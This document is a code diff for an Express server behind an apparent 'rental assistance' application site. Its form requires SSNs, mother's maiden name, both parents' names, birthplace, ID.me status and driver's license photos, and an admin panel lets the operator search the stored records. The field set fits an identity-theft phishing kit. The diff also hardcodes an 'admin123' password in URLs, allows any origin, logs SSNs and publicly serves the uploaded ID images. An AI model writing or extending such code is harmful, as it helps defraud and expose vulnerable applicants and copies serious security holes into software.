@@ -8,13 +8,24 @@ const app = express();
 const PORT = 3000;
 
 // Middleware
+app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+    next();
+});
+
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Create uploads directory
+// Create directories if they don't exist
 if (!fs.existsSync('uploads')) {
     fs.mkdirSync('uploads', { recursive: true });
+}
+
+if (!fs.existsSync('admin')) {
+    fs.mkdirSync('admin', { recursive: true });
 }
 
 // File upload setup
@@ -24,12 +35,15 @@ const storage = multer.diskStorage({
         cb(null, Date.now() + path.extname(file.originalname));
     }
 });
-const upload = multer({ storage });
+const upload = multer({ 
+    storage,
+    limits: { fileSize: 5 * 1024 * 1024 }
+});
 
 // Database setup
 const db = new Database('./rental_assistance.db');
 
-// Create table with ALL required fields
+// Create table with correct column count
 db.prepare(`CREATE TABLE IF NOT EXISTS applications (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     full_name TEXT NOT NULL,
@@ -57,37 +71,64 @@ db.prepare(`CREATE TABLE IF NOT EXISTS applications (
 console.log('✅ Database and table ready');
 
 // Public Routes
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
-app.get('/survey', (req, res) => res.sendFile(path.join(__dirname, 'public', 'survey.html')));
-app.get('/confirmation', (req, res) => res.sendFile(path.join(__dirname, 'public', 'confirmation.html')));
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
-// Submit application
+app.get('/survey', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'survey.html'));
+});
+
+app.get('/confirmation', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'confirmation.html'));
+});
+
+app.get('/name.html', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'name.html'));
+});
+
+// ADMIN LOGIN PAGE
+app.get('/admin-login', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
+});
+
+// Submit application - FIXED SQL INSERT
 app.post('/submit', upload.fields([{ name: 'dl_front' }, { name: 'dl_back' }]), (req, res) => {
     try {
+        console.log('📝 Submission received');
+        console.log('Body:', req.body);
+        console.log('Files:', req.files);
+        
         const data = req.body;
 
-        const requiredFields = ['full_name', 'phone', 'email', 'dob', 'gender', 'age',
-                               'mothers_maiden_name', 'mothers_full_name', 'fathers_full_name',
-                               'place_of_birth', 'city_of_birth', 'city', 'ssn',
-                               'past_due_rent', 'applied_before', 'receiving_ss', 'verified_idme'];
+        // Validate required fields
+        const requiredFields = [
+            'full_name', 'phone', 'email', 'dob', 'gender', 'age',
+            'mothers_maiden_name', 'mothers_full_name', 'fathers_full_name',
+            'place_of_birth', 'city_of_birth', 'city', 'ssn',
+            'past_due_rent', 'applied_before', 'receiving_ss', 'verified_idme'
+        ];
 
-        for (const field of requiredFields) {
-            if (!data[field] || data[field].toString().trim() === '') {
-                return res.status(400).json({ success: false, error: `Missing required field: ${field}` });
-            }
+        const missingFields = requiredFields.filter(field => !data[field] || data[field].toString().trim() === '');
+        
+        if (missingFields.length > 0) {
+            console.log('❌ Missing fields:', missingFields);
+            return res.status(400).json({ 
+                success: false, 
+                error: `Missing required fields: ${missingFields.join(', ')}` 
+            });
         }
 
-        const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
-        if (!ssnRegex.test(data.ssn)) console.log('Warning: SSN format might be incorrect:', data.ssn);
-
+        // Prepare SQL statement with correct number of values (19 columns)
         const stmt = db.prepare(`INSERT INTO applications (
             full_name, phone, email, dob, gender, age,
             mothers_maiden_name, mothers_full_name, fathers_full_name,
             place_of_birth, city_of_birth, city, ssn,
             past_due_rent, applied_before, receiving_ss, verified_idme,
-            dl_front, dl_back
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
+            dl_front, dl_back, submitted_at
+        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
 
+        // Execute insertion with 20 values (19 columns + id auto)
         const info = stmt.run(
             data.full_name.trim(),
             data.phone.trim(),
@@ -107,86 +148,75 @@ app.post('/submit', upload.fields([{ name: 'dl_front' }, { name: 'dl_back' }]), 
             data.receiving_ss,
             data.verified_idme,
             req.files?.dl_front ? req.files.dl_front[0].filename : null,
-            req.files?.dl_back ? req.files.dl_back[0].filename : null
+            req.files?.dl_back ? req.files.dl_back[0].filename : null,
+            new Date().toISOString() // submitted_at
         );
 
         console.log('✅ Application saved successfully. ID:', info.lastInsertRowid);
-        res.json({ success: true, message: 'Application submitted successfully', applicationId: info.lastInsertRowid });
+        
+        res.json({ 
+            success: true, 
+            message: 'Application submitted successfully', 
+            applicationId: info.lastInsertRowid,
+            redirect: '/confirmation.html'
+        });
 
     } catch (error) {
         console.error('❌ Submission error:', error);
-        res.status(500).json({ success: false, error: 'Internal server error' });
+        res.status(500).json({ 
+            success: false, 
+            error: 'Internal server error',
+            details: error.message 
+        });
     }
 });
 
 // ===== ADMIN ROUTES =====
 const ADMIN_PASSWORD = 'admin123';
+
+// Admin authentication middleware
 const requireAdmin = (req, res, next) => {
     const password = req.query.password || req.headers['x-admin-password'];
-    if (password === ADMIN_PASSWORD) next();
-    else res.status(401).send(`
-        <h1>Admin Access Required</h1>
-        <p>Please enter the admin password:</p>
-        <form method="GET">
-            <input type="password" name="password" placeholder="Enter password">
-            <button type="submit">Login</button>
-        </form>
-    `);
+    
+    if (req.path === '/admin-login') {
+        return next();
+    }
+    
+    if (password === ADMIN_PASSWORD) {
+        return next();
+    }
+    
+    res.redirect('/admin-login');
 };
 
 // Admin dashboard
 app.get('/admin', requireAdmin, (req, res) => {
+    const password = req.query.password;
+    
+    if (password !== ADMIN_PASSWORD) {
+        return res.redirect('/admin-login');
+    }
+    
     const dashboardPath = path.join(__dirname, 'admin', 'dashboard.html');
-    if (fs.existsSync(dashboardPath)) return res.sendFile(dashboardPath);
+    if (fs.existsSync(dashboardPath)) {
+        return res.sendFile(dashboardPath);
+    }
 
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
             <title>Admin Dashboard</title>
-            <style>
-                body { font-family: Arial; padding: 20px; }
-                table { border-collapse: collapse; width: 100%; }
-                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-                th { background-color: #f2f2f2; }
-            </style>
         </head>
         <body>
             <h1>Admin Dashboard</h1>
             <div id="applications"></div>
-            <script>
-                async function loadApplications() {
-                    const response = await fetch('/api/admin/applications?password=${ADMIN_PASSWORD}');
-                    const applications = await response.json();
-                    let html = '<h2>Applications (' + applications.length + ')</h2>';
-                    if (applications.length > 0) {
-                        html += '<table><tr><th>ID</th><th>Name</th><th>Email</th><th>Phone</th><th>Mother</th><th>Father</th><th>Birth City</th><th>Rent Due</th><th>Submitted</th></tr>';
-                        applications.forEach(app => {
-                            html += \`<tr>
-                                <td>\${app.id}</td>
-                                <td>\${app.full_name}</td>
-                                <td>\${app.email}</td>
-                                <td>\${app.phone}</td>
-                                <td>\${app.mothers_full_name}</td>
-                                <td>\${app.fathers_full_name}</td>
-                                <td>\${app.city_of_birth}</td>
-                                <td>\$\${app.past_due_rent}</td>
-                                <td>\${new Date(app.submitted_at).toLocaleString()}</td>
-                            </tr>\`;
-                        });
-                        html += '</table>';
-                    } else html += '<p>No applications yet.</p>';
-                    document.getElementById('applications').innerHTML = html;
-                }
-                loadApplications();
-                setInterval(loadApplications, 30000);
-            </script>
         </body>
         </html>
     `);
 });
 
-// Admin API
+// Admin API routes
 app.get('/api/admin/applications', requireAdmin, (req, res) => {
     const rows = db.prepare('SELECT * FROM applications ORDER BY submitted_at DESC').all();
     res.json(rows);
@@ -204,8 +234,12 @@ app.get('/api/admin/search', requireAdmin, (req, res) => {
 
     const searchPattern = `%${q}%`;
     const rows = db.prepare(`SELECT * FROM applications 
-                             WHERE full_name LIKE ? OR email LIKE ? OR phone LIKE ? OR ssn LIKE ? OR city LIKE ? OR mothers_full_name LIKE ? OR fathers_full_name LIKE ? OR city_of_birth LIKE ?
-                             ORDER BY submitted_at DESC`).all(searchPattern, searchPattern, searchPattern, searchPattern, searchPattern, searchPattern, searchPattern, searchPattern);
+                             WHERE full_name LIKE ? OR email LIKE ? OR phone LIKE ? OR ssn LIKE ? 
+                             OR city LIKE ? OR mothers_full_name LIKE ? OR fathers_full_name LIKE ? 
+                             OR city_of_birth LIKE ? ORDER BY submitted_at DESC`).all(
+        searchPattern, searchPattern, searchPattern, searchPattern, 
+        searchPattern, searchPattern, searchPattern, searchPattern
+    );
     res.json(rows);
 });
 
@@ -231,19 +265,25 @@ app.get('/api/admin/stats', requireAdmin, (req, res) => {
 app.use('/uploads', express.static('uploads'));
 
 // 404 handler
-app.use((req, res) => res.status(404).send('Page not found'));
+app.use((req, res) => {
+    res.status(404).send('Page not found');
+});
 
 // Error handler
 app.use((err, req, res, next) => {
     console.error('❌ Server error:', err);
-    res.status(500).send('Something went wrong');
+    res.status(500).json({ 
+        success: false, 
+        error: 'Something went wrong'
+    });
 });
 
 // Start server
 app.listen(PORT, () => {
     console.log(`
 🚀 Server running on http://localhost:${PORT}
-🔐 Admin access: http://localhost:${PORT}/admin?password=${ADMIN_PASSWORD}
+🔐 Admin login: http://localhost:${PORT}/admin-login
+📊 Dashboard: http://localhost:${PORT}/admin?password=${ADMIN_PASSWORD}
 📁 Uploads: http://localhost:${PORT}/uploads
 📊 Database: rental_assistance.db
 `);
